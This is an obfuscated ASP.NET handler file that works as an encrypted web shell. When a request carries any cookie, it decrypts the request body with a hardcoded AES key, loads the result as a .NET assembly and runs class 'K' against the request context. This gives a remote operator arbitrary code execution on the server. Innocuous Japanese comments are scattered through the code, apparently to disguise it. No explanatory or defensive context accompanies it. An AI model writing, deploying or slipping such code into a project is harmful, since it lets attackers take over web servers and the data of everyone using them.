<%@ WebHandler Language="C#" Class="Y" %>
using System.Web;using System.Text;
public class Y:IHttpHandler{public void ProcessRequest(HttpContext p){if(p.Request.Cookies.Count!=0){string[] s={"c","a","6","3","4","5","7","5","3","8","b","9","b","1","e","0"};var sb=new StringBuilder();foreach(string c in s){sb.Append(c);}byte[]k=Encoding.Default.GetBytes(sb.ToString()),d=new byte[p.Request.ContentLength];p.Request.InputStream.Read(d,0,d.Length);var r=new System.Security.Cryptography.RijndaelManaged();var t=r.CreateDecryptor(k,k);
// 明日の天気は晴れるでしょう。
byte[] l=t.TransformFinalBlock(d,0,d.Length);var a=System.Reflection.Assembly.Load(l);
// 私は猫が好きです。
var i=a.CreateInstance(new string(new char[]{'K'}));
// 月が綺麗ですね。
i.Equals(p);};}public bool IsReusable{get{
// お腹すいた。
return false;}}}